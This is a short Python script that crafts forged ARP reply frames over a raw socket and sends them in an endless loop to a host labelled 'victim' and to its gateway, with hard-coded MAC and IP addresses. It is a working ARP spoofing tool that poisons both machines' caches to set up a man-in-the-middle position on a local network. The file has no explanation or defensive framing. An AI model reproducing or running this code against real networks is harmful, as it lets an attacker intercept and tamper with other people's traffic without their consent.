import socket 
import struct 
import binascii 
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800)) 
s.bind(("ens192",socket.htons(0x0800)))

sor = '\x00\x50\x56\x8f\xa2\x1f'
victmac ='\x00\x50\x56\x8f\xba\x07'
gatemac = '\x00\x09\x0f\x09\x00\x0a' 
code ='\x08\x06' 
eth1 = victmac+sor+code #for victim 
eth2 = gatemac+sor+code # for gateway

htype = '\x00\x01' 
protype = '\x08\x00' 
hsize = '\x06' 
psize = '\x04' 
opcode = '\x00\x02'

gate_ip = '172.18.201.1' 
victim_ip = '172.18.201.115' 
gip = socket.inet_aton ( gate_ip ) 
vip = socket.inet_aton ( victim_ip )

arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip 
arp_gateway= eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip

while 1:  
	s.send(arp_victim)  
	s.send(arp_gateway)